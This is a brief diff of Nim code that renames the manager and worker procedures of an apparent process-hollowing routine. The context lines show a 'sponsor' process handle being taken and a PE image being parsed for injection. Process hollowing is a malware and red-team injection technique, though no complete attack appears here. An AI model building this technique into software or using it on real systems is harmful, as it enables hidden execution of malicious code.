@@ -195,7 +195,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
         quit(1)
 
 
-proc hollow4Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
+proc hollow3Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
     
     # Extract process information
     let sponsorProcessHandle = sponsorProcessInfo.hProcess
@@ -215,7 +215,7 @@ proc hollow4Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): b
     discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
 
  
-proc hollow4Worker*(peStr: string): bool =
+proc hollow3Worker*(peStr: string): bool =
   
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
